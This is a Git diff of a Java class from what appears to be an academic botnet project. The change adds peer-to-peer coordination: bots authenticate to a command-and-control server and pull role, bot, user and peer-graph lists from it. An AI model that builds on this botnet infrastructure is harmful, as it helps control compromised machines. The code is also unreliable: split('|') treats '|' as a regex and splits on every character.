@@ -6,6 +6,7 @@ import java.security.InvalidKeyException;
 import java.security.NoSuchAlgorithmException;
 import java.security.PublicKey;
 import java.security.SignatureException;
+import java.util.ArrayList;
 import java.util.Collections;
 import java.util.Comparator;
 import java.util.List;
@@ -18,6 +19,8 @@ import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.scheduling.annotation.Async;
 import org.springframework.stereotype.Service;
 
+import com.mysql.cj.fabric.xmlrpc.base.Array;
+
 import cs.sii.domain.IP;
 import cs.sii.domain.Pairs;
 import cs.sii.domain.SyncIpList;
@@ -26,6 +29,7 @@ import cs.sii.model.role.Role;
 import cs.sii.model.user.User;
 import cs.sii.network.request.BotRequest;
 import cs.sii.service.connection.NetworkService;
+import cs.sii.service.connection.P2PMan;
 import cs.sii.service.crypto.CryptoPKI;
 import cs.sii.service.dao.BotServiceImpl;
 import cs.sii.service.dao.RoleServiceImpl;
@@ -58,6 +62,9 @@ public class Behavior {
 	@Autowired
 	private UserServiceImpl uServ;
 
+	@Autowired
+	private P2PMan pServ;
+
 	// Il secondo valore è vuoto però ci serviva una lista sincata per non
 	// implementarla di nuovo
 	@Autowired
@@ -76,11 +83,12 @@ public class Behavior {
 	public void initializeBot() {
 
 		nServ.firstConnectToMockServerDns();
-		
-		 if (challengeToCommandConquer()) {
-		  System.out.println("Bot is Ready"); } else
-		 System.out.println("Bot not Ready, authentication failed");
-		 
+
+		if (challengeToCommandConquer()) {
+			System.out.println("Bot is Ready");
+		} else
+			System.out.println("Bot not Ready, authentication failed");
+
 		String data = nServ.getIdHash();
 
 		List<Pairs<IP, PublicKey>> ips = nServ.getCommandConquerIps().getList();
@@ -234,47 +242,57 @@ public class Behavior {
 		this.req = request;
 	}
 
-	
-//	class RolesComp implements Comparator<Role>{
-//		
-//		@Override
-//		public int compare(Role a, Role b ){
-//			if(a.getId()>b.getId())
-//			return 1
-//		}
-//	}
-	
+	// class RolesComp implements Comparator<Role>{
+	//
+	// @Override
+	// public int compare(Role a, Role b ){
+	// if(a.getId()>b.getId())
+	// return 1
+	// }
+	// }
+
 	/**
 	 * @param ip
 	 */
 	@Async
 	public void getPower(String ip) {
+		pServ.createNetworkP2P();
 		// richiesta ruoli
 		List<Role> roles = req.getRoles(ip);
-		Collections.sort(roles, (a,b)-> a.getId()<b.getId() ? -1 : a.getId()==b.getId() ? 0 : 1);
+		Collections.sort(roles, (a, b) -> a.getId() < b.getId() ? -1 : a.getId() == b.getId() ? 0 : 1);
 		roles.forEach(role -> System.out.println("ruolo: " + role));
 		rServ.saveAll(roles);
 
 		// richiesta bots
 		List<Bot> bots = req.getBots(ip);
-		Collections.sort(bots, (a,b)-> a.getId()<b.getId() ? -1 : a.getId()==b.getId() ? 0 : 1);
+		Collections.sort(bots, (a, b) -> a.getId() < b.getId() ? -1 : a.getId() == b.getId() ? 0 : 1);
 		bots.forEach(bot -> System.out.println("bots: " + bot));
 		bServ.saveAll(bots);
-		
-		
+
 		// richiesta users
 		List<User> users = req.getUser(ip);
-		Collections.sort(users, (a,b)-> a.getId()<b.getId() ? -1 : a.getId()==b.getId() ? 0 : 1);
+		Collections.sort(users, (a, b) -> a.getId() < b.getId() ? -1 : a.getId() == b.getId() ? 0 : 1);
 		users.forEach(user -> System.out.println("users: " + user));
 		uServ.saveAll(users);
-		
+
 		// prendo grafo
 		List<String> graph = req.getPeers(ip);
 
 		graph.forEach(e -> System.out.println("edges: " + e));
 		// informo cc vecchio che spnp ready
-		//
 
+		
+		List<IP> vertex = new ArrayList<IP>();
+		List<Pairs<IP, IP>> edge = new ArrayList<Pairs<IP, IP>>();
+		List<String[]> strs = new ArrayList<String[]>();
+		for (String str : graph) {
+			String[] sts = str.split("|");
+			edge.add(new Pairs<IP, IP>(new IP(sts[0]), new IP(sts[1])));
+			vertex.add(new IP(sts[0]));
+			vertex.add(new IP(sts[1]));
+		}
+
+		pServ.updateNetworkP2P(edge,vertex);
 	}
 }
 
@@ -288,4 +306,3 @@ public class Behavior {
 // eseguire la funzione opportuna.
 // TODO inserire controller dove arriva la lista dei vicini il bot verifica il
 // msg se appartiene alla chiave del cec aggiorna il suo vicinato
-
